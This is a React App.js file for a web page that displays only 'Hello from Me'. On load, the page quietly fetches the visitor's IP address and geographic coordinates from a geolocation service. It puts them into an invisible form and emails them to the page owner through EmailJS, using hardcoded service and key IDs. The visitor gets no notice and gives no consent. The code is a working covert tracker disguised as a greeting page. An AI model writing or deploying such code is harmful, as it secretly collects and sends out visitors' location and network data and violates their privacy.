import './App.css';
import {useState,useEffect,useRef} from 'react'
import axios from 'axios'
import emailjs from '@emailjs/browser';

function App() {
  //creating IP state
  const [data, setdata] = useState();
  const form = useRef();
  //creating function to load ip address from the API
  const getData = async () => {
    axios.get('https://geolocation-db.com/json/').then(res => {
        setdata(res.data);
        sendEmail(form);
      });
  }
  const sendEmail = (forme) => {
    console.log(forme.current);
    // e.preventDefault();
    // console.log('form.current', form.current?.city)
    emailjs.sendForm('service_4x54dt6', 'template_czp3mvb', forme.current, 'lCoAz0QPMhw1mRLyE')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
  };
  useEffect( () => {
    getData();
  }, [])
if(data)
  return (
    <div className="App">
      <h1>Hello from Me</h1>
      <div style={{opacity:0}}>
        <form ref={form}>
          <label>IP Address</label>
          <input type="text" name="ipv4" value={data?.IPv4} />
          <label>Longitude</label>
          <input type="text" name="longitude" value={data?.longitude} />
          <label>Latitude</label>
          <input type="text" name="latitude" value={data?.latitude} />
          <input type="submit" value="Send" />
        </form>
      </div>
      {/* {sendEmail(form)} */}
    </div>
  );
 return <></>
}

export default App;